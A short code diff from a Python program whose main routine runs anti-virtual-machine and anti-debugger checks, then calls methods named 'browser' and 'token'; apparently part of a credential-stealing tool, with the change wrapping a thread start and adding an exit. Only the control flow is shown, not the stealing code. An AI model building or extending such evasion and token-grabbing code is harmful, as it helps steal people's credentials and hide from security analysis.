@@ -63,10 +63,13 @@ class Main:
         antivm.Antidbg.proc_check()
         antivm.Antidbg.dll_check()
 
-        Thread(target=antivm.Antidbg.process_check).start()
+        t1 = Thread(target=antivm.Antidbg.process_check)
+        t1.start()
 
         self.browser()
         self.token()
+
+        sys.exit()
 
 if __name__ == "__main__":
     Main().run()
